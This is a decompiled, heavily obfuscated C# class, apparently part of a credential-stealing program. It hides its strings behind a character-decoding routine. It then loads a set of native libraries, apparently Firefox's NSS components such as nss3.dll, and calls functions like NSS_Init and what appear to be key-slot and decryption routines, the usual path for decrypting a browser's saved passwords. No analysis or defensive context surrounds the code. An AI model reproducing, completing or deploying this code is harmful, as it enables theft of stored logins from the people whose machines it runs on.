using System;
using System.Runtime.InteropServices;
using System.Text;

internal class Class16
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate9(string string_0);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate10();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate11(long long_0, bool bool_0, long long_1);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Delegate12(IntPtr intptr_0, IntPtr intptr_1, StringBuilder stringBuilder_0, int int_0);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Delegate13(ref Struct1 struct1_0, ref Struct1 struct1_1, int int_0);

	public class Class17
	{
		public static byte[] byte_0;

		public static long long_0;
	}

	public struct Struct1
	{
		public int int_0;

		public int int_1;

		public int int_2;
	}

	private static IntPtr intptr_0;

	public static string string_0;

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_1, string string_1);

	[DllImport("kernel32", SetLastError = true)]
	private static extern IntPtr LoadLibrary(string string_1);

	public static long smethod_0(string string_1)
	{
		string text = Class12.smethod_18() + _003CModule_003E.smethod_0("\u0349\u0358ͺ\u036fͼ\u0379\u0379ʹ\u0335\u0353ͼ\u0367Ͱͳͺ\u036d\u0349", 789);
		LoadLibrary(text + _003CModule_003E.smethod_0("\u05b9\u05bb\u05ae\u05b7\u05a6\u05a0ץ\u05ed\u05fa\u05b0\u05b8\u05b8", 1492));
		LoadLibrary(text + _003CModule_003E.smethod_0("ƒƏƌƎǈǒƘƐƐ", 508));
		LoadLibrary(text + _003CModule_003E.smethod_0("\u0944क़\u0957\u0900चॐक़क़", 2356));
		LoadLibrary(text + _003CModule_003E.smethod_0("█▔▜▋◌◖▜▔▔", 9720));
		LoadLibrary(text + _003CModule_003E.smethod_0("❰❰❶❷❪❯✰✭❧❯❯", 9987));
		LoadLibrary(text + _003CModule_003E.smethod_0("ݓݑ\u0744ݍݏݒݗ\u074aݛ܍ܐݚݒݒ", 1854));
		LoadLibrary(text + _003CModule_003E.smethod_0("۽\u06e0\u06e0ۦ\u06e7ۺۿڠڽ۷ۿۿ", 1683));
		LoadLibrary(text + _003CModule_003E.smethod_0("\u1089႕\u109cႎ႕႑႔\u10c9ე႞႖႖", 4346));
		intptr_0 = LoadLibrary(text + _003CModule_003E.smethod_0("Ⴧლლ\u109a\u1087ჍჅჅ", 4265));
		Delegate9 @delegate = (Delegate9)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, _003CModule_003E.smethod_0("\u0a54\u0a49\u0a49\u0a45\u0a53ੴੳ੮", 2586)), typeof(Delegate9));
		return @delegate(string_1);
	}

	public static int smethod_1(IntPtr intptr_1, IntPtr intptr_2, StringBuilder stringBuilder_0, int int_0)
	{
		Delegate12 @delegate = (Delegate12)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, _003CModule_003E.smethod_0("Ὣὶὶὧὄὖὀἓἑὺὡὀ\u1f46Ὂὁὀὧὐὃὃὀὗ", 7973)), typeof(Delegate12));
		return @delegate(intptr_1, intptr_2, stringBuilder_0, int_0);
	}

	public static long smethod_2(long long_0, bool bool_0, long long_1)
	{
		Delegate11 @delegate = (Delegate11)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, _003CModule_003E.smethod_0("\u0c56\u0c4dషషౙ\u0c47\u0c73\u0c72౮\u0c63౨\u0c72౯\u0c65౧\u0c72\u0c63", 3078)), typeof(Delegate11));
		return @delegate(long_0, bool_0, long_1);
	}

	public static long smethod_3()
	{
		Delegate10 @delegate = (Delegate10)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, _003CModule_003E.smethod_0("\u08e0\u08fb\u0881\u0881\u08ef\u08f7\u08d5ࣄ\u08f9\u08deࣄ\u08d5ࣂ\u08de\u08d1\u08dc\u08fb\u08d5\u08c9\u08e3\u08dc\u08dfࣄ", 2224)), typeof(Delegate10));
		return @delegate();
	}

	public static int smethod_4(ref Struct1 struct1_0, ref Struct1 struct1_1, int int_0)
	{
		Delegate13 @delegate = (Delegate13)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, _003CModule_003E.smethod_0("⋊⋑⊫⊫⋉⋞⋈⋅⋞⋿⋹⋨⋣⋪⋮", 8858)), typeof(Delegate13));
		return @delegate(ref struct1_0, ref struct1_1, int_0);
	}
}
